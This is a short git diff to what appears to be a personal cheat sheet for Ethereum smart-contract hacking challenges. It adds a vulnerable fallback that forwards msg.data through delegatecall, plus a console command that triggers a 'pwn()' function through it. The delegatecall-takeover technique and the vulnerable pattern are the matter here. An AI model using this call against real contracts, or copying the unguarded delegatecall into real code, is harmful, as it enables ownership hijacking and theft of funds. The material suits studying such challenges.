@@ -30,3 +30,18 @@ contract is a truffle object. can do fallback methods using
 ```
 contract.sendTransction({value: 50000000});
 ```
+
+
+### Delegate call with encoding of function signature
+```
+  fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+  }
+  
+  # Called with
+  await contract.sendTransaction({data: web3.eth.abi.encodeFunctionSignature("pwn()")})
+  
+```
